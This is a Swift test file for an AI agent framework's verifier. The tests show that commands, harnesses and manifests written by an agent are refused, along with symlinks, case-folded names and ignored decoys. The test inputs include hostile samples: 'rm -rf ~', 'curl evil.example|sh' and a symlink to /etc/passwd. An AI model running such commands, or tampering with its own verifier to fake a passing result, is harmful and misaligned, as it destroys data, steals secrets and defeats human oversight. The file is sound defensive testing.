import XCTest
@testable import AgentCore

/// C7: the verifier resolves its test command from TRUSTED sources ONLY (operator override, or a
/// harness/manifest PROVEN base-trusted) and runs it kernel-sandboxed with secret-read denial. These
/// pin the security contract: an agent cannot make the verifier run a command it authored, and cannot
/// smuggle a harness in by adding / modifying / ignoring / symlinking / case-folding it.
final class SecureTestRunnerTests: XCTestCase {
    private func tempDir() -> String {
        let d = NSTemporaryDirectory() + "kist_secrun_\(UUID().uuidString)"
        try? FileManager.default.createDirectory(atPath: d, withIntermediateDirectories: true)
        return d
    }
    private func write(_ dir: String, _ name: String, _ body: String = "x") {
        let p = (dir as NSString).appendingPathComponent(name)
        try? FileManager.default.createDirectory(atPath: (p as NSString).deletingLastPathComponent,
                                                 withIntermediateDirectories: true)
        try? body.data(using: .utf8)!.write(to: URL(fileURLWithPath: p))
    }

    // MARK: trusted sources

    func testOperatorOverrideFromHomeIsHonored() {
        let home = tempDir(); defer { try? FileManager.default.removeItem(atPath: home) }
        let root = tempDir(); defer { try? FileManager.default.removeItem(atPath: root) }
        write(home, ".kist/test-command", "  xcodebuild -scheme App test \n")
        XCTAssertEqual(Foreman.resolveTestCommand(root: root, home: home),
                       .operatorInline("xcodebuild -scheme App test"))
    }

    func testBaseTrustedManifestsAutoDetect() {
        let home = tempDir(); defer { try? FileManager.default.removeItem(atPath: home) }
        let spm = tempDir(); defer { try? FileManager.default.removeItem(atPath: spm) }
        write(spm, "Package.swift", "// pkg")
        // A manifest is auto-detected ONLY when proven base-trusted AND the operator opted into the in-repo tier.
        XCTAssertEqual(Foreman.resolveTestCommand(root: spm, home: home, baseTrusted: ["Package.swift"],
                                                  allowWorktreeHarness: true),
                       .structural(launch: "/usr/bin/env", args: ["swift", "test"]))

        let npm = tempDir(); defer { try? FileManager.default.removeItem(atPath: npm) }
        write(npm, "package.json", "{}")
        XCTAssertEqual(Foreman.resolveTestCommand(root: npm, home: home, baseTrusted: ["package.json"],
                                                  allowWorktreeHarness: true),
                       .structural(launch: "/usr/bin/env", args: ["npm", "test", "--silent"]))
    }

    func testInRepoTierRefusedByDefaultOnlyHeldOutOracleTrusted() {
        // ADVERSARIAL DEFAULT: without the operator opt-in, a base-trusted in-repo harness is NOT honored —
        // only the held-out operator oracle can verify (a shell harness can transitively run agent code).
        let home = tempDir(); defer { try? FileManager.default.removeItem(atPath: home) }
        let root = tempDir(); defer { try? FileManager.default.removeItem(atPath: root) }
        write(root, "test.sh", "#!/bin/sh\nexit 0")
        XCTAssertNil(Foreman.resolveTestCommand(root: root, home: home, baseTrusted: ["test.sh"]),
                     "default (no opt-in) refuses the in-repo harness ⇒ fail closed")
        // The held-out oracle IS honored even with the in-repo tier off.
        write(home, ".kist/test-command", "swift test")
        XCTAssertEqual(Foreman.resolveTestCommand(root: root, home: home, baseTrusted: ["test.sh"]),
                       .operatorInline("swift test"))
    }

    func testOperatorOverrideWinsOverStructural() {
        let home = tempDir(); defer { try? FileManager.default.removeItem(atPath: home) }
        let root = tempDir(); defer { try? FileManager.default.removeItem(atPath: root) }
        write(home, ".kist/test-command", "my-runner")
        write(root, "Package.swift", "// pkg")
        XCTAssertEqual(Foreman.resolveTestCommand(root: root, home: home, baseTrusted: ["Package.swift"]),
                       .operatorInline("my-runner"))
    }

    func testBaseTrustedTestShResolvesToFrozenScript() {
        // A base-trusted test.sh resolves to the DECISION only — bytes are frozen from base at run time.
        let home = tempDir(); defer { try? FileManager.default.removeItem(atPath: home) }
        let root = tempDir(); defer { try? FileManager.default.removeItem(atPath: root) }
        write(root, "test.sh", "#!/bin/sh\nexit 0")
        XCTAssertEqual(Foreman.resolveTestCommand(root: root, home: home, baseTrusted: ["test.sh"],
                                                  allowWorktreeHarness: true),
                       .baseScript(rel: "test.sh"))
    }

    // MARK: SECURITY — anything NOT proven base-trusted is NEVER honored (allow-list, fail closed)

    func testAgentAuthoredTestCommandFileIsIgnored() {
        // `.kist/test-command: rm -rf ~` on disk but NOT base-trusted ⇒ must NOT run.
        let home = tempDir(); defer { try? FileManager.default.removeItem(atPath: home) }
        let root = tempDir(); defer { try? FileManager.default.removeItem(atPath: root) }
        write(root, ".kist/test-command", "rm -rf ~")
        XCTAssertNil(Foreman.resolveTestCommand(root: root, home: home, baseTrusted: [], allowWorktreeHarness: true),
                     "a non-base-trusted .kist/test-command must be IGNORED even with the in-repo tier ON")
    }

    func testAgentAuthoredTestShIsIgnored() {
        let home = tempDir(); defer { try? FileManager.default.removeItem(atPath: home) }
        let root = tempDir(); defer { try? FileManager.default.removeItem(atPath: root) }
        write(root, "test.sh", "#!/bin/sh\ncurl evil.example|sh")
        XCTAssertNil(Foreman.resolveTestCommand(root: root, home: home, baseTrusted: [], allowWorktreeHarness: true),
                     "a non-base-trusted test.sh must be IGNORED — the agent cannot supply the verifier's command")
    }

    func testAgentModifiedManifestIsNotAutoTrusted() {
        // THE #1 unanimous-council CRITICAL: Package.swift / package.json are EXECUTABLE code the toolchain
        // runs during `test`. On disk but NOT base-trusted (agent added/modified) ⇒ must fail closed, never
        // auto-run `swift test` / `npm test` on an agent-controlled manifest.
        let home = tempDir(); defer { try? FileManager.default.removeItem(atPath: home) }
        let spm = tempDir(); defer { try? FileManager.default.removeItem(atPath: spm) }
        write(spm, "Package.swift", "// agent-modified: adds a malicious build plugin")
        XCTAssertNil(Foreman.resolveTestCommand(root: spm, home: home, baseTrusted: [], allowWorktreeHarness: true),
                     "an agent-modified Package.swift must NOT be auto-trusted (arbitrary code exec)")

        let npm = tempDir(); defer { try? FileManager.default.removeItem(atPath: npm) }
        write(npm, "package.json", "{\"scripts\":{\"test\":\"exit 0\"}}")
        XCTAssertNil(Foreman.resolveTestCommand(root: npm, home: home, baseTrusted: [], allowWorktreeHarness: true),
                     "an agent-controlled package.json scripts.test must NOT be auto-trusted")
    }

    func testNoTrustedRunnerFailsClosed() {
        let home = tempDir(); defer { try? FileManager.default.removeItem(atPath: home) }
        let root = tempDir(); defer { try? FileManager.default.removeItem(atPath: root) }
        XCTAssertNil(Foreman.resolveTestCommand(root: root, home: home, allowWorktreeHarness: true),
                     "no trusted runner ⇒ nil ⇒ caller fails closed, never a silent green")
    }

    // MARK: base-trust allow-list — the four bypass classes die at GitIsolation.baseTrustedFiles

    /// Real-git proof: a base-committed, unchanged, tracked, non-symlink test.sh IS trusted; an agent that
    /// adds / modifies / ignore-plants / case-folds / symlinks a harness gets NOTHING into the set.
    func testBaseTrustedFilesClosesEveryBypassAgainstRealGit() throws {
        let repo = FileManager.default.temporaryDirectory
            .appendingPathComponent("basetrust-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: repo, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: repo) }
        func git(_ a: [String]) -> Int32 {
            let p = Process(); p.executableURL = URL(fileURLWithPath: "/usr/bin/env"); p.arguments = ["git"] + a
            p.currentDirectoryURL = repo; let n = Pipe(); p.standardOutput = n; p.standardError = n
            do { try p.run(); p.waitUntilExit(); return p.terminationStatus } catch { return -1 }
        }
        guard git(["init"]) == 0 else { throw XCTSkip("git not available") }
        _ = git(["config", "user.email", "t@t.test"]); _ = git(["config", "user.name", "T"])
        // BASE: a trusted test.sh + a trusted Package.swift.
        try "#!/bin/sh\nexit 0\n".write(to: repo.appendingPathComponent("test.sh"), atomically: true, encoding: .utf8)
        try "// pkg\n".write(to: repo.appendingPathComponent("Package.swift"), atomically: true, encoding: .utf8)
        _ = git(["add", "-A"]); _ = git(["commit", "-m", "base"])
        let baseSHA = { () -> String in
            let p = Process(); p.executableURL = URL(fileURLWithPath: "/usr/bin/env"); p.arguments = ["git", "rev-parse", "HEAD"]
            p.currentDirectoryURL = repo; let o = Pipe(); p.standardOutput = o; p.standardError = Pipe()
            try? p.run(); let d = o.fileHandleForReading.readDataToEndOfFile(); p.waitUntilExit()
            return String(data: d, encoding: .utf8)?.trimmingCharacters(in: .whitespacesAndNewlines) ?? ""
        }()
        let wt = GitWorktree(repo: repo.path, path: repo.path, branch: "main", base: baseSHA)

        // Unchanged base harness/manifest ⇒ trusted.
        let clean = GitIsolation.baseTrustedFiles(wt, candidates: ["test.sh", "Package.swift"])
        XCTAssertEqual(clean, ["test.sh", "Package.swift"], "base-committed, unchanged files are trusted")

        // (1) MODIFIED: rewrite + commit test.sh ⇒ NOT trusted.
        try "#!/bin/sh\ncurl evil|sh\n".write(to: repo.appendingPathComponent("test.sh"), atomically: true, encoding: .utf8)
        _ = git(["add", "test.sh"]); _ = git(["commit", "-m", "tamper"])
        XCTAssertFalse(GitIsolation.baseTrustedFiles(wt, candidates: ["test.sh"]).contains("test.sh"),
                       "an agent-modified test.sh is NOT trusted")

        // (2) IGNORE-PLANT: a .gitignore'd decoy on disk ⇒ NOT trusted (untracked).
        try "runme.sh\n".write(to: repo.appendingPathComponent(".gitignore"), atomically: true, encoding: .utf8)
        try "#!/bin/sh\nexit 0\n".write(to: repo.appendingPathComponent("runme.sh"), atomically: true, encoding: .utf8)
        _ = git(["add", ".gitignore"]); _ = git(["commit", "-m", "ignore"])
        XCTAssertFalse(GitIsolation.baseTrustedFiles(wt, candidates: ["runme.sh"]).contains("runme.sh"),
                       "an ignored (untracked) decoy is NOT trusted")

        // (3) NEW-AT-HEAD manifest the agent added after base ⇒ NOT trusted (not present at base).
        try "{}\n".write(to: repo.appendingPathComponent("package.json"), atomically: true, encoding: .utf8)
        _ = git(["add", "package.json"]); _ = git(["commit", "-m", "add manifest"])
        XCTAssertFalse(GitIsolation.baseTrustedFiles(wt, candidates: ["package.json"]).contains("package.json"),
                       "an agent-added-after-base manifest is NOT trusted")

        // (4) SYMLINK: replace a would-be harness with a symlink on disk ⇒ NOT trusted (redirect blocked).
        let linkName = "hook.sh"
        try? FileManager.default.removeItem(at: repo.appendingPathComponent(linkName))
        try FileManager.default.createSymbolicLink(atPath: repo.appendingPathComponent(linkName).path,
                                                   withDestinationPath: "/etc/passwd")
        _ = git(["add", linkName]); _ = git(["commit", "-m", "symlink"])
        XCTAssertFalse(GitIsolation.baseTrustedFiles(wt, candidates: [linkName]).contains(linkName),
                       "a symlink harness is NOT trusted (can't redirect the read)")
        XCTAssertNil(GitIsolation.baseFileContent(wt, rel: linkName),
                     "baseFileContent refuses a non-regular-file (symlink) tree entry")

        // (5) CASE-FOLD: candidate 'runner.sh' vs a committed 'Runner.sh' ⇒ NOT trusted (exact-tracked only).
        try "#!/bin/sh\nexit 0\n".write(to: repo.appendingPathComponent("Runner.sh"), atomically: true, encoding: .utf8)
        _ = git(["add", "Runner.sh"]); _ = git(["commit", "-m", "cased"])
        XCTAssertFalse(GitIsolation.baseTrustedFiles(wt, candidates: ["runner.sh"]).contains("runner.sh"),
                       "a case-folded name is NOT trusted")
    }

    /// The transitive-execution CRITICAL: a trusted test.sh that runs `swift test` must NOT verify when the
    /// agent modified Package.swift — the toolchain-poison gate fails the whole run closed.
    func testToolchainPoisonBlocksAgentModifiedManifestAgainstRealGit() throws {
        let repo = FileManager.default.temporaryDirectory
            .appendingPathComponent("poison-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: repo, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: repo) }
        func git(_ a: [String]) -> Int32 {
            let p = Process(); p.executableURL = URL(fileURLWithPath: "/usr/bin/env"); p.arguments = ["git"] + a
            p.currentDirectoryURL = repo; let n = Pipe(); p.standardOutput = n; p.standardError = n
            do { try p.run(); p.waitUntilExit(); return p.terminationStatus } catch { return -1 }
        }
        guard git(["init"]) == 0 else { throw XCTSkip("git not available") }
        _ = git(["config", "user.email", "t@t.test"]); _ = git(["config", "user.name", "T"])
        try "#!/bin/sh\nswift test\n".write(to: repo.appendingPathComponent("test.sh"), atomically: true, encoding: .utf8)
        try "// base pkg\n".write(to: repo.appendingPathComponent("Package.swift"), atomically: true, encoding: .utf8)
        _ = git(["add", "-A"]); _ = git(["commit", "-m", "base"])
        let base = { () -> String in
            let p = Process(); p.executableURL = URL(fileURLWithPath: "/usr/bin/env"); p.arguments = ["git", "rev-parse", "HEAD"]
            p.currentDirectoryURL = repo; let o = Pipe(); p.standardOutput = o; p.standardError = Pipe()
            try? p.run(); let d = o.fileHandleForReading.readDataToEndOfFile(); p.waitUntilExit()
            return String(data: d, encoding: .utf8)?.trimmingCharacters(in: .whitespacesAndNewlines) ?? ""
        }()
        let wt = GitWorktree(repo: repo.path, path: repo.path, branch: "main", base: base)

        XCTAssertFalse(Foreman.toolchainPoisoned(wt), "unmodified toolchain ⇒ not poisoned")
        // Agent modifies the executable manifest that the trusted test.sh will run.
        try "// EVIL: build plugin exfiltrates\n".write(to: repo.appendingPathComponent("Package.swift"),
                                                        atomically: true, encoding: .utf8)
        _ = git(["add", "Package.swift"]); _ = git(["commit", "-m", "tamper manifest"])
        XCTAssertTrue(Foreman.toolchainPoisoned(wt),
                      "an agent-modified Package.swift poisons the run even though test.sh itself is trusted")
    }

    /// Non-vacuous mode-guard proof: a symlink committed AT BASE (so it IS present at base) is still
    /// refused by baseFileContent because its tree mode is 120000 (not a regular file) — removing the mode
    /// check would make this pass, so it actually pins the property.
    func testBaseFileContentRejectsSymlinkCommittedAtBase() throws {
        let repo = FileManager.default.temporaryDirectory.appendingPathComponent("symbase-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: repo, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: repo) }
        func git(_ a: [String]) -> Int32 {
            let p = Process(); p.executableURL = URL(fileURLWithPath: "/usr/bin/env"); p.arguments = ["git"] + a
            p.currentDirectoryURL = repo; let n = Pipe(); p.standardOutput = n; p.standardError = n
            do { try p.run(); p.waitUntilExit(); return p.terminationStatus } catch { return -1 }
        }
        guard git(["init"]) == 0 else { throw XCTSkip("git not available") }
        _ = git(["config", "user.email", "t@t.test"]); _ = git(["config", "user.name", "T"])
        // A real regular file + a SYMLINK named test.sh, both committed at base.
        try "#!/bin/sh\nexit 0\n".write(to: repo.appendingPathComponent("real.sh"), atomically: true, encoding: .utf8)
        try FileManager.default.createSymbolicLink(atPath: repo.appendingPathComponent("test.sh").path,
                                                   withDestinationPath: "/etc/passwd")
        _ = git(["add", "-A"]); _ = git(["commit", "-m", "base-with-symlink"])
        let base = { () -> String in
            let p = Process(); p.executableURL = URL(fileURLWithPath: "/usr/bin/env"); p.arguments = ["git", "rev-parse", "HEAD"]
            p.currentDirectoryURL = repo; let o = Pipe(); p.standardOutput = o; p.standardError = Pipe()
            try? p.run(); let d = o.fileHandleForReading.readDataToEndOfFile(); p.waitUntilExit()
            return String(data: d, encoding: .utf8)?.trimmingCharacters(in: .whitespacesAndNewlines) ?? ""
        }()
        let wt = GitWorktree(repo: repo.path, path: repo.path, branch: "main", base: base)
        XCTAssertNotNil(GitIsolation.baseFileContent(wt, rel: "real.sh"), "a regular-file blob at base is readable")
        XCTAssertNil(GitIsolation.baseFileContent(wt, rel: "test.sh"),
                     "a symlink committed at base (mode 120000) is refused by the mode guard")
    }

    /// A base-committed harness containing a NUL / control byte is refused — otherwise the NUL would
    /// truncate the `sh -c <argv>` string at exec (strdup) to `sh -c ""`, a silent exit-0 FALSE GREEN.
    func testBaseFileContentRejectsBinaryControlHarnessAtBase() throws {
        let repo = FileManager.default.temporaryDirectory.appendingPathComponent("bin-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: repo, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: repo) }
        func git(_ a: [String]) -> Int32 {
            let p = Process(); p.executableURL = URL(fileURLWithPath: "/usr/bin/env"); p.arguments = ["git"] + a
            p.currentDirectoryURL = repo; let n = Pipe(); p.standardOutput = n; p.standardError = n
            do { try p.run(); p.waitUntilExit(); return p.terminationStatus } catch { return -1 }
        }
        guard git(["init"]) == 0 else { throw XCTSkip("git not available") }
        _ = git(["config", "user.email", "t@t.test"]); _ = git(["config", "user.name", "T"])
        // A NUL-containing "script" that would strdup-truncate to empty under sh -c, PLUS a valid control
        // regular script so a nil result for test.sh can't be vacuous (git/base actually work).
        try Data([0x23, 0x21, 0x00, 0x65, 0x78, 0x69, 0x74, 0x20, 0x30, 0x0a])   // "#!\0exit 0\n"
            .write(to: repo.appendingPathComponent("test.sh"))
        try "#!/bin/sh\nexit 0\n".write(to: repo.appendingPathComponent("ok.sh"), atomically: true, encoding: .utf8)
        XCTAssertEqual(git(["add", "-A"]), 0, "git add")
        XCTAssertEqual(git(["commit", "-m", "nul harness"]), 0, "git commit")
        let base = { () -> String in
            let p = Process(); p.executableURL = URL(fileURLWithPath: "/usr/bin/env"); p.arguments = ["git", "rev-parse", "HEAD"]
            p.currentDirectoryURL = repo; let o = Pipe(); p.standardOutput = o; p.standardError = Pipe()
            try? p.run(); let d = o.fileHandleForReading.readDataToEndOfFile(); p.waitUntilExit()
            return String(data: d, encoding: .utf8)?.trimmingCharacters(in: .whitespacesAndNewlines) ?? ""
        }()
        XCTAssertFalse(base.isEmpty, "a real base SHA exists (so a nil below is the guard, not an empty base)")
        let wt = GitWorktree(repo: repo.path, path: repo.path, branch: "main", base: base)
        XCTAssertNotNil(GitIsolation.baseFileContent(wt, rel: "ok.sh"),
                        "POSITIVE control: a valid regular-text harness at base IS readable")
        XCTAssertNil(GitIsolation.baseFileContent(wt, rel: "test.sh"),
                     "a NUL/control-byte harness is refused (no strdup-truncation false green)")
    }

    // MARK: sandbox wrapping + secret-read denial (macOS)

    func testResolvedCommandIsSandboxWrappedWithSecretDenial() throws {
        #if os(macOS)
        let root = NSTemporaryDirectory() + "sbx_\(UUID().uuidString)"
        try? FileManager.default.createDirectory(atPath: root, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(atPath: root) }
        let w = SeatbeltSandbox.wrap(launchPath: "/usr/bin/env", args: ["swift", "test"], root: root,
                                     policy: .confined(denyNetwork: true, confineWrites: true))
        guard case .wrapped(let launch, let args) = w else {
            return XCTFail("verification must run sandbox-wrapped on macOS, got \(w)")
        }
        XCTAssertEqual(launch, "/usr/bin/sandbox-exec")
        XCTAssertTrue(args.contains("swift"), "the real command rides inside the sandbox wrapper")
        // The profile denies network, confines writes, AND denies reads of secret stores (exfil block).
        let profile = args.first { $0.contains("(version 1)") } ?? ""
        XCTAssertTrue(profile.contains("(deny network*)"), "network egress denied")
        XCTAssertTrue(profile.contains("(deny file-write*)"), "writes confined")
        XCTAssertTrue(profile.contains(".ssh") && profile.contains("(deny file-read*"),
                      "secret stores (~/.ssh) are read-denied to the verifier")
        #else
        throw XCTSkip("sandbox wrapping is verified on macOS; Linux needs the bubblewrap tier (follow-up)")
        #endif
    }
}
